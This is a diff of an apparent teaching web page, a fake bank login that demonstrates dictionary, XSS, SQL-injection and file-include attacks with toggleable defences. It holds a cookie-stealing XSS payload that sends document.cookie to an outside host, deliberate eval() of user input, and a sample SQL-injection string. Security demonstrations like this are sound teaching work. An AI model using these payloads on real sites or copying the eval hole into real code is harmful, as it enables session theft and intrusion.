@@ -1,37 +1,6 @@
-<!DOCTYPE <!DOCTYPE html>
-<html lang="fr">
-
-    <head>
-    
-        <!-- allow to use accents -->
-        <meta charset="utf-8">
-        
-        <!-- Basic SEO Optimization -->
-        <meta name="description" content="">
-        <meta name="keywords" content="">
-        
-        <!-- allow compatibility with IE -->
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        
-        <!-- allow compatibility with small devices like tablets and phones -->
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        
-        <!-- title of the website -->
-        <title>Security tests</title>
-        
-        <!-- icon of the website -->
-        <link rel="shortcut icon" href="">
-        
-        <!-- Fonts : need to be load before any others css files (Default Font "Roboto") -->
-        <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,300i,400,400i,700,700i" rel="stylesheet">
-        
-        <!-- CSS -->
-        <link rel="stylesheet" href="css/bootstrap.min.css">
-        
-    </head>
-
-    <body>
+<?php include("header.php"); ?>
 		<?php
+
         if (isset( $_GET['includeattack'] ) )
         {
             $format = "./includeattack/includeattack1";
@@ -39,24 +8,38 @@
         }
         ?>
 
-        <div class="container">
+        <div class="section col-md-6 col-md-offset-3">
+        	<h1 style="text-align:center">MMA Bank & Co.</h1>
+        	<div class="row">
+
+                <div class="col-md-10 col-md-offset-1">
+                    
+                    <div id="displayWithoutSecurity"></div>
+
+                </div>
+                
+            </div>
+        
             <div class="row">
-                <div class="col-md-6">
+            
+                <div class="col-md-10 col-md-offset-1">
+                    
+                    <h3 style="text-align:center;">To see your accounts, please enter your login</h3>
 
-                    <h2 style="text-align:center;">Sans Sécurité</h2>
-
-                    <form id="formWithoutSecurity">
+                    <form id="formWithoutSecurity" action="processorWithoutSecurity.php" method="post" onSubmit="return submitCheck();">
 	                    <div class="form-group">
 	                      <label for="labelLogin">Login</label>
-	                      <input type="text" class="form-control" id="loginWithoutSecurity" placeholder="Login">
+	                      <input type="text" class="form-control" id="loginWithoutSecurity" placeholder="Login" name="login">
 	                    </div>
 	                    <div class="form-group" id="divWithoutSecurity">
-	                      <label for="labelPassword">Password</label>
-	                      <input type="password" class="form-control" id="passwordWithoutSecurity" placeholder="Password">
+	                      <label id="labelPasswordWithoutSecurity" for="labelPassword">Password</label>
+	                      <input type="password" class="form-control" id="passwordWithoutSecurity" placeholder="Password" name="pass">
 	                    </div>
+                        
+                        <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-primary">Connect</button>
 
-	                    <div id="radio-group" style="border: 4px solid red; padding: 0 10px 0 10px; margin: 10px 0 10px 0;">
-	                    	<h3 style="text-align:center;">Select your attack</h3>
+	                    <div class="h3 dropdown">Select your attack <i class="mdi mdi-menu-down pull-right"></i></div>
+	                    <div id="radio-group" class="radio-group red" style="display:none">
 	                    	<div class="radio">
 							    <label><input type="radio" id="rb-dictionary" name="attack" value="dict-attack">Dictionary Attack</label>
 							</div>
@@ -70,49 +53,29 @@
 							    <label><input type="radio" id="rb-none" name="attack" value="no-attack">None</label>
 							</div>
 	                    </div>
-
-	                    <div id="checkbox-group" style="border: 4px solid green; padding: 0 10px 0 10px; margin: 10px 0 10px 0;">
-	                    	<h3 style="text-align:center;">Select your defence(s)</h3>
+						<hr/>
+                        <div class="h3 dropdown">Select your defence(s) <i class="mdi mdi-menu-down pull-right"></i></div>
+	                    <div id="checkbox-group" class="radio-group green" style="display:none">
+	                    	
 
 							<div class="checkbox">
 						  		<label><input type="checkbox" id="cb-xss" value="">Prevent Cross-site scripting</label>
 							</div>
 							<div class="checkbox">
-						  		<label><input type="checkbox" id="cb-sql" value="">Prevent Injections SQL</label>
+						  		<label><input type="checkbox" id="cb-sql" value="" name="sql">Prevent Injections SQL</label>
 							</div>
 							<div class="checkbox">
 						  		<label><input type="checkbox" id="cb-dic" value="">Prevent Dictionary and/or Brute Force attacks</label>
 							</div>
 	                    </div>
-	                    
-						
-                          <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-danger">Submit Without Security</button>
                     </form>
 
                     <!--<button type="button" id="submitDictionaryAttack" class="btn btn-block btn-warning">Dictionary Attack</button>-->
 
                 </div>
-                
-                <div class="col-md-6">
-                    
-                    <h2 style="text-align:center;">Avec Sécurité</h2>
-
-                    <form id="formWithSecurity">
-                          <div class="form-group">
-                            <label for="labelLogin">Login</label>
-                            <input type="text" class="form-control" id="loginWithSecurity" placeholder="Login">
-                          </div>
-                          <div class="form-group has-error" id="divWithSecurity">
-                            <label for="labelPassword" >Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min</label>
-                            <input type="password" class="form-control" id="passwordWithSecurity" placeholder="Password">
-                          </div>
-                          <button type="submit" id="submitWithSecurity" class="btn btn-block btn-success disabled">Submit With Security</button>
-                    </form>
-
-                </div>
 
             </div>
-
+<!--
             <hr style="border: 0; 
 					  height: 5px; 
 					  background-image: -webkit-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
@@ -120,21 +83,7 @@
 					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
 					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">
 
-            <div class="row">
-
-                <div class="col-md-6">
-                    
-                    <div id="displayWithoutSecurity"></div>
-
-                </div>
-
-                <div class="col-md-6">
-                    
-                    <div id="displayWithSecurity"></div>
-
-                </div>
-
-            </div>
+            
 
             <hr style="border: 0; 
 					  height: 5px; 
@@ -142,13 +91,12 @@
 					  background-image: -moz-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
 					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
 					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">
-
+-->
             <div class="row">
 
-                <div class="col-md-12">
+                <div class="col-md-10 col-md-offset-1">
 
-                    <br/><br/><br/>
-                    <button type="button" id="clear" class="btn btn-block btn-info">Clear everything</button>
+                    <button type="button" id="clear" class="btn btn-block btn-warning">Clear everything</button>
 
                 </div>
 
@@ -164,139 +112,72 @@
 
         <script>
         $(document).ready(function(){
+			$(".dropdown").click(function(){	
+				var mdi = $(this).find(".mdi");
+			
+				if(mdi.hasClass("mdi-menu-down")){
+					mdi.removeClass("mdi-menu-down");
+					mdi.addClass("mdi-menu-up");
+				}
+				else{
+					mdi.removeClass("mdi-menu-up");
+					mdi.addClass("mdi-menu-down");
+				}
+				$(this).next(".radio-group").slideToggle();
+			});
 
         	/* XSS Attack - Put malicious JS in login input */
             $('input[type=radio][name=attack]').change(function() {
-		        if (this.value == 'xss-attack') {
-                	$("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/xssattack/xss.php?c=\"+document.cookie);");
-		        }
+				switch(this.value){
+		        	case 'xss-attack' :
+						$("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/uha/xssattack/xss.php?c=\"+document.cookie);");
+						break;
+				}
+		    });
+			
+			$('#cb-dic').change(function() {
+				if($(this).is(":checked")){
+					$("#passwordWithoutSecurity").addClass("protected");
+					checkPasswordValid($("#passwordWithoutSecurity"));
+					$("#labelPasswordWithoutSecurity").html("Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min");
+				}
+				else{
+					$("#passwordWithoutSecurity").removeClass("protected");
+					$("#passwordWithoutSecurity").parent().removeClass("has-error");
+					$("#submitWithoutSecurity").removeClass("disabled");
+					$("#labelPasswordWithoutSecurity").html("Password");
+				}
 		    });
 			
 			/* Handle the event when the form with security is submitted */
 			/* Example SQL injection ==> mickael' or 1=1 -- ' */
-            $("#submitWithoutSecurity").click(function(){
-
-            	if($("#rb-dictionary").is(":checked")){
-            		var login = $("#loginWithoutSecurity").val();
-					var dataString = 'login='+ login;
-					if(login == '')
-					{
-						$("#displayWithoutSecurity").html("<h3 style=\"text-align:center;\">Need a login at least</h3>");
-					}
-					else
-					{
-						$("#displayWithoutSecurity").html("Searching in progress...");
-						$.ajax({
-							type: "POST",
-							url: "dictionaryattack/dictionary.php",
-							data: dataString,
-							cache: false,
-							success: function(result){
-								$("#displayWithoutSecurity").html(result);
-							}
-						});
-					}
-					return false;
-            	} 
-				else {
-            		var login = $("#loginWithoutSecurity").val();
-					var pass = $("#passwordWithoutSecurity").val();
-					var prevent_sql = "no";
-
-					if($("#cb-sql").is(':checked')){
-						prevent_sql = "yes";
-					}
-
-					if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
-						try {
-							eval(login);
-						} catch (err) {
-							console.log("message : " + err + " and is not a javascript function");
-						}
-
-						try {
-							eval(pass);
-						} catch (err) {
-							console.log("message : " + err + " and is not a javascript function");
-						}
-					}
-					
-					var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
-					if(login == '' || pass == '')
-					{
-						$("#displayWithoutSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
-					}
-					else
-					{
-						if($("#rb-include").is(":checked")){
-							window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
-						}
-						else{
-							$.ajax({
-								type: "POST",
-								url: "processorWithoutSecurity.php",
-								data: dataString,
-								cache: false,
-								success: function(result){
-									$("#displayWithoutSecurity").html(result);
-								}
-							});
-						}
-					}
-					return false;
-            	}				
-            });
-			
-			$("#submitWithSecurity").click(function(){
-				if(!$('#submitWithSecurity').hasClass('disabled')){
-					var login = $("#loginWithSecurity").val();
-					var pass = $("#passwordWithSecurity").val();
-					var dataString = 'login='+ login + '&pass='+ pass;
-					if(login == '' || pass == '')
-					{
-						$("#displayWithSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
-					}
-					else
-					{
-						$.ajax({
-							type: "POST",
-							url: "processorWithSecurity.php",
-							data: dataString,
-							cache: false,
-							success: function(result){
-								$("#displayWithSecurity").html(result);
-							}
-						});
-					}
-					return false;
-				} else {
-					return false;
-				}
-            });
+            
 			
 			/* Handle the event when writting the password */
-			$('#passwordWithSecurity').keyup(function(){
-				var inputVal = $(this).val();
-				//var div = $('#divWithSecurity')[0];
-				//var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
-				var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
-				if(!regex.test(inputVal)) {
-					console.log("Not good enough ...");
-					if(!$('#divWithSecurity').hasClass('form-group has-error')){
-						$('#divWithSecurity').removeClass();
-						$('#divWithSecurity').addClass("form-group has-error");
-					}
-					if(!$('#submitWithSecurity').hasClass('disabled')){
-						$('#submitWithSecurity').addClass("disabled");
-					}
-				}else{
-					console.log("Good !!!");
-					//div.removeClass().addClass("form-group has-success");
-					$('#divWithSecurity').removeClass();
-					$('#divWithSecurity').addClass("form-group has-success");
-					$('#submitWithSecurity').removeClass("disabled");
-				}
+			$('#passwordWithoutSecurity').keyup(function(){
+				checkPasswordValid($(this));
 			});
+			
+			function checkPasswordValid(el){
+				if($(el).hasClass("protected")){
+					var inputVal = $(el).val();
+					//var div = $('#divWithoutSecurity')[0];
+					//var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
+					var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
+					if(!regex.test(inputVal)) {
+						console.log("Not good enough ...");
+						$('#divWithoutSecurity').removeClass("has-success");
+						$('#divWithoutSecurity').addClass("has-error");
+						$('#submitWithoutSecurity').addClass("disabled");
+					}else{
+						console.log("Good !!!");
+						//div.removeClass().addClass("form-group has-success");
+						$('#divWithoutSecurity').removeClass("has-error");
+						$('#divWithoutSecurity').addClass("has-success");
+						$('#submitWithoutSecurity').removeClass("disabled");
+					}
+				}
+			}
 
 			/* Handle the dictionary attack */
 			/*$('#submitDictionaryAttack').click(function(){
@@ -332,15 +213,96 @@
 					$.removeCookie('password', { path: '/' });
 				}
 
-				$("#displayWithSecurity").html("");
 				$("#displayWithoutSecurity").html("");
-				$("#formWithSecurity")[0].reset();
 				$("#formWithoutSecurity")[0].reset();
 			});
 
         });
+		
+		function submitCheck(){
+
+            	if($("#rb-dictionary").is(":checked")){
+            		var login = $("#loginWithoutSecurity").val();
+					var dataString = 'login='+ login;
+					if(login == '')
+					{
+						$("#displayWithoutSecurity").html("<h4 class='bg-danger message'>Need a login at least</h4>");
+					}
+					else
+					{
+						$("#displayWithoutSecurity").html("Searching in progress...");
+						$.ajax({
+							type: "POST",
+							url: "dictionaryattack/dictionary.php",
+							data: dataString,
+							cache: false,
+							success: function(result){
+								result = result.split("&*###*&");
+								var data = result[0];
+								var name = result[1];
+								var pass = result[2];
+								$("#displayWithoutSecurity").html(data);
+								$("#loginWithoutSecurity").val(name);
+								$("#passwordWithoutSecurity").val(pass);
+								$("#rb-none").attr("checked", "checked");
+								setTimeout(function(){
+									$("#formWithoutSecurity").submit();
+								}, 2000);
+							}
+						});
+						return false;
+					}
+					return false;
+            	} 
+				else {
+            		var login = $("#loginWithoutSecurity").val();
+					var pass = $("#passwordWithoutSecurity").val();
+					var prevent_sql = "no";
+
+					if($("#cb-sql").is(':checked')){
+						prevent_sql = "yes";
+					}
+
+					if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
+						try {
+							eval(login);
+						} catch (err) {
+							console.log("message : " + err + " and is not a javascript function");
+						}
+
+						try {
+							eval(pass);
+						} catch (err) {
+							console.log("message : " + err + " and is not a javascript function");
+						}
+					}
+					
+					var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
+					if(login == '' || pass == '')
+					{
+						$("#displayWithoutSecurity").html("<h4 class='bg-warning message' >Please fill all fields</h4>");
+						return false;
+					}
+					else
+					{
+						if($("#rb-include").is(":checked")){
+							window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
+						}
+						return true;
+						/*
+						else{
+							$.ajax({
+								type: "POST",
+								url: "processorWithoutSecurity.php",
+								data: dataString,
+								cache: false,
+								success: function(result){
+									$("#displayWithoutSecurity").html(result);
+								}
+							});
+						}*/
+					}
+            	}				
+            }
         </script>
-
-    </body>
-
-</html>
+<?php include("footer.php"); ?>
